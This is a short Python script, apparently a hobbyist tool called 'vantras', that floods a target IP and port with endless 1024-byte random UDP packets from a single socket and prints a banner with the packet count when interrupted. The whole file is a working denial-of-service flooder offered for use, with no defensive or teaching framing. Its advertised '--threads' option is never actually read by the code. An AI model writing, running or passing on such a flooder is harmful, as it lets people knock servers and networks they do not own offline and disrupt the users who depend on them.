import socket
import random
import sys

#usage vantras <ip> <port> --threads <threads>
#           argv[1] argv[2]  argv[3]  argv[4]


def sent(atck_ip,atck_port,i):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(1024)

        port = int(atck_port)
        ip = atck_ip
        
        while True:
            try:

                i += 1
                sock.sendto(packet, (ip, port))

            except KeyboardInterrupt:
                end(i)

    except IndexError:
        print('''something is wrong!
usage: vantras <ip> <port> --threads <threads>''')
        exit()

def end(i):
    print(f"""
                                    ░██
                                    ░██
░██    ░██  ░██████   ░████████  ░████████ ░██░████  ░██████    ░███████
░██    ░██       ░██  ░██    ░██    ░██    ░███           ░██  ░██
░██  ░██   ░███████  ░██    ░██    ░██    ░██       ░███████   ░███████
░██░██   ░██   ░██  ░██    ░██    ░██    ░██      ░██   ░██         ░██
░███     ░█████░██ ░██    ░██     ░████ ░██       ░█████░██  ░███████
_______________________________________________________________________________
packages sent: {i}
See you space cowboy!
""")
    exit()


def main():
    i = 0

    try: 
        if len(sys.argv[1]) >3 and len(sys.argv[2]) >= 2:
          sent(sys.argv[1],sys.argv[2],i)

    except IndexError:

     print('''using default port:
[*] 80
''')
    sent(sys.argv[1],80,i)


if __name__ == '__main__':
    
    main()
